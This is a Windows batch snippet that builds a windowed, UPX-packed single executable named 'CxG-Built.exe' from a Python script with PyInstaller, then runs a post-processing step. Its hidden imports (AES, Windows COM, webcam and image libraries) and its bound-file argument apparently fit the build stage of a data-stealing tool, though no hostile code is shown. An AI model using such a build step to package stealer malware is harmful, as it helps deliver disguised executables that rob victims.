pyinstaller %mode% --onefile --windowed --upx-dir "Components" --clean --noconfirm "Components/main.py" --name "CxG-Built.exe" --hidden-import base64 --hidden-import pyaes --hidden-import ctypes.wintypes --hidden-import json --hidden-import shutil --hidden-import zipfile --hidden-import glob --hidden-import PIL --hidden-import win32com.client --hidden-import cv2 --version-file "Components/version.txt" %bound%
if %errorlevel%==0 (
    cls
    title Post processing...
    python postprocess.py
    explorer.exe dist
    exit
) else (
    color 4 && title ERROR
    pause > NUL
    exit
)